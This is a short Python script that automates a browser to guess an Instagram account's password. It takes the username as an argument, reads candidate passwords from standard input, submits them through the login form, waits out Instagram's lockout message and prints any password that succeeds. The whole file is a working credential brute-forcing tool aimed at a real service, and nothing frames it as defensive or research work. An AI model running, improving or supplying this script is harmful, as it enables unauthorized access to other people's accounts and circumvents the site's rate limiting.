#!/bin/python
from splinter import Browser
import time
import sys

WAIT_TIME = 11 * 60 + 35  # 11 minutes and 35 seconds
PROBLEM_LOGGING_IN = "There was a problem logging you into Instagram. Please try again soon."

def is_login_successful(browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not (browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))

def main():
    if len(sys.argv) != 2:
        print("Please provide the Instagram account username as a command-line argument.")
        print("Usage: python script_name.py <account_username>")
        print("Example: python script_name.py j.o.k.e.r_tash")
        return

    account_username = sys.argv[1]
    correct_password = None
    passwords_tried = 0
    max_passwords = 15

    # Specify the path to GeckoDriver
    geckodriver_path = 'C:/Users/joker/Downloads/geckodriver-v0.34.0-win32'

    with Browser('firefox', executable_path=geckodriver_path) as browser:
        browser.visit('https://www.instagram.com')
        browser.find_by_text("Log in").first.click()
        username_form = browser.find_by_name('username').first
        password_form = browser.find_by_name('password').first
        login_button = browser.find_by_text('Log in').first
        username_form.fill(account_username)

        for password in sys.stdin:
            password = password.strip()  # Remove leading/trailing whitespace
            if len(password) < 6:
                print('Skipping password: ' + password)
                continue

            passwords_tried += 1
            if passwords_tried > max_passwords:
                print(f"Max password attempts ({max_passwords}) reached. Exiting.")
                break

            print('Testing password: ' + password)
            password_form.clear()
            password_form.fill(password)
            login_button.click()

            if browser.is_text_present(PROBLEM_LOGGING_IN):
                print('Waiting for timeout to end.')
                time.sleep(WAIT_TIME)
                print('Timeout has ended, resuming.')
            elif is_login_successful(browser):
                correct_password = password
                break

    if correct_password is None:
        print("Unable to find correct password.")
    else:
        print("Password for username: " + account_username + " = " + correct_password)

if __name__ == "__main__":
    main()



